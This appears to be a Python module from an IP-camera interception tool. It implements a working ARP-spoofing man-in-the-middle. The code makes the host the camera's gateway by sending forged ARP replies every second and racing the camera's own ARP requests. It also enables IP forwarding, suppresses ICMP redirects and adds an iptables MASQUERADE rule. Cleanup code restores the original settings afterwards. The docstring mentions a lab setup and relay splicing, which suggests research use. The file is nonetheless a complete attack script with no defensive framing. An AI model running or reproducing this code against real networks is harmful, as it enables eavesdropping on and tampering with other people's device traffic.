"""Getting on the camera's path (router mode)."""
import subprocess
import threading
import time
from pathlib import Path

from .netutil import ensure_libpcap, ipt, route_get

ensure_libpcap()
from scapy.all import ARP, Ether, get_if_hwaddr, sendp, sniff  # noqa: E402


class OnPath:
    """Make this host the camera's router: ARP-poison only the camera (we
    become its gateway) and MASQUERADE its traffic out under our address.

    Two-way poisoning (camera AND router) made the router route spoofed
    camera packets that it had also bridged from WiFi to our port with
    the identical 5-tuple; its fast path then sent them back to us with
    the camera's MAC (TTL -1 per bounce, a 25 us ping-pong) and kept doing
    so after the MITM stopped, black-holing that camera flow until the
    camera changed ports; the splice's own media came straight back
    instead of reaching the relay. In router mode the real router only
    ever routes our flows and its ARP table is untouched.

    The camera's existing flows survive the switch: the relays follow
    the new NAT mapping from its next keepalive, no reboot needed.

    poison=False skips the ARP step for hosts that already carry the
    camera's traffic (a gateway, or the netns lab)."""

    def __init__(self, cam_ip, iface, poison, gateway=None):
        self.cam_ip, self.iface, self.poison = cam_ip, iface, poison
        self.gateway = gateway or route_get("8.8.8.8").split(" via ")[1].split()[0]
        self.stop = threading.Event()
        self.undo = []

    def _sysctl(self, path, value):
        p = Path(path)
        old = p.read_text().strip()
        p.write_text(f"{value}\n")
        self.undo.append(lambda: p.write_text(old + "\n"))

    def start(self):
        self._sysctl("/proc/sys/net/ipv4/ip_forward", 1)
        for dev in ("all", self.iface):
            # forwarding out the interface the packet came in on would
            # send the camera ICMP redirects naming the real gateway
            self._sysctl(f"/proc/sys/net/ipv4/conf/{dev}/send_redirects", 0)
        rule = ("-t", "nat", "POSTROUTING", "-s", self.cam_ip, "-o",
                self.iface, "-j", "MASQUERADE")
        if ipt(rule[0], rule[1], "-C", *rule[2:]).returncode != 0:
            ipt(rule[0], rule[1], "-A", *rule[2:])
            self.undo.append(lambda: ipt(rule[0], rule[1], "-D", *rule[2:]))
        if self.poison:
            self._arp_start()
        print(f"[+] on-path: MASQUERADE {self.cam_ip} out {self.iface}"
              f"{', camera-only ARP poison' if self.poison else ''}")

    def _arp_start(self):
        me = get_if_hwaddr(self.iface)
        cam_mac = self._mac(self.cam_ip)
        gw_mac = self._mac(self.gateway)
        lie = (Ether(dst=cam_mac, src=me)
               / ARP(op=2, psrc=self.gateway, hwsrc=me, pdst=self.cam_ip,
                     hwdst=cam_mac))
        truth = (Ether(dst=cam_mac, src=gw_mac)
                 / ARP(op=2, psrc=self.gateway, hwsrc=gw_mac,
                       pdst=self.cam_ip, hwdst=cam_mac))

        def tick():
            while not self.stop.is_set():
                sendp(lie, iface=self.iface, verbose=False)
                self.stop.wait(1.0)

        def answer():
            # win the race when the camera asks for its gateway
            def cb(p):
                if (ARP in p and p[ARP].op == 1 and p[ARP].psrc == self.cam_ip
                        and p[ARP].pdst == self.gateway):
                    sendp(lie, iface=self.iface, verbose=False)
            while not self.stop.is_set():
                try:
                    sniff(iface=self.iface, filter="arp", prn=cb, store=False,
                          timeout=5, stop_filter=lambda _: self.stop.is_set())
                except Exception as e:  # noqa: BLE001  (suspend/resume)
                    print(f"[!] ARP responder error ({e}); retrying")
                    self.stop.wait(2)

        threading.Thread(target=tick, daemon=True).start()
        threading.Thread(target=answer, daemon=True).start()

        def restore():
            for _ in range(5):
                sendp(truth, iface=self.iface, verbose=False)
                time.sleep(0.3)
        self.undo.append(restore)

    def _mac(self, ip):
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True)
        out = subprocess.run(["ip", "neigh", "show", ip], capture_output=True,
                             text=True).stdout.split()
        if "lladdr" not in out:
            raise SystemExit(f"cannot resolve MAC for {ip}")
        return out[out.index("lladdr") + 1]

    def close(self):
        if self.stop.is_set():
            return
        self.stop.set()
        for fn in reversed(self.undo):
            try:
                fn()
            except Exception as e:  # noqa: BLE001
                print(f"[!] on-path cleanup step failed: {e}")
        print("[+] on-path mode off")
